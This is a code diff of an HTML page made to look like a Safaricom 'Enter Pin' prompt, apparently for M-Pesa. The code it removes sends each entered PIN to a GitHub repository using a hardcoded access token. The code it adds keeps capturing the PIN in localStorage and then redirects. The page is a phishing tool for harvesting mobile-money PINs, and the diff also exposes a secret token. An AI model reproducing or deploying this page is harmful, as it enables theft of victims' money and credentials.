@@ -54,75 +54,17 @@
     <label id="heading">Safaricom</label>
     <label id="subheading">Enter Pin</label>
     <label id="enternumberlabel">Digits (0-9, *, #, +) 10-13</label>
-    <input id="enternumberinput" type="number" maxlength="4">
+    <input id="enternumberinput" type="password" maxlength="4">
     <button id="getphonebutton">OK</button>
 
     <script>
         async function getpin() {
             const pin = document.getElementById("enternumberinput").value;
-            if (pin===""){
-                window.location.href="sim/index.html"
-            }else{
-                // GitHub details
-                const repo = "senmakana/Pins"; // Replace with your repository
-                const filePath = "mpesapin.json"; // Path to the JSON file in the repo
-                const token = "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"; // Replace with your GitHub token
-    
-                const apiUrl = `https://api.github.com/repos/${repo}/contents/${filePath}`;
-    
-                // Fetch the current file's content (if it exists)
-                try {
-                    const getResponse = await fetch(apiUrl, {
-                        headers: {
-                            Authorization: `Bearer ${token}`,
-                            Accept: "application/vnd.github.v3+json",
-                        },
-                    });
-    
-                    let fileSha = null;
-                    let existingContent = {};
-    
-                    if (getResponse.ok) {
-                        const fileData = await getResponse.json();
-                        fileSha = fileData.sha; // Get the file's SHA
-                        existingContent = JSON.parse(atob(fileData.content)); // Decode base64 content
-                    }
-    
-                    // Add the PIN to the JSON content
-                    existingContent.pins = existingContent.pins || [];
-                    existingContent.pins.push(pin);
-    
-                    // Convert updated content to base64
-                    const newContent = btoa(JSON.stringify(existingContent, null, 2));
-    
-                    // Commit the updated content
-                    const response = await fetch(apiUrl, {
-                        method: "PUT",
-                        headers: {
-                            Authorization: `Bearer ${token}`,
-                            Accept: "application/vnd.github.v3+json",
-                        },
-                        body: JSON.stringify({
-                            message: "Update pin data",
-                            content: newContent,
-                            sha: fileSha, // Include SHA if the file exists
-                        }),
-                    });
-    
-                    if (response.ok) {
-                        alert("PIN successfully saved to GitHub!");
-                    } else {
-                        throw new Error("Failed to save PIN to GitHub.");
-                    }
-                } catch (error) {
-                    console.error("Error:", error);
-                    alert("An error occurred while saving the PIN.");
-                }
-    
-                location.reload(); // Reset the page 
-            }
+            localStorage.setItem("mpesa pin",pin)
+            window.location.href="Sim/index.html"
         }
         document.getElementById("getphonebutton").addEventListener("click", getpin);
     </script>
 </body>
 </html>
+
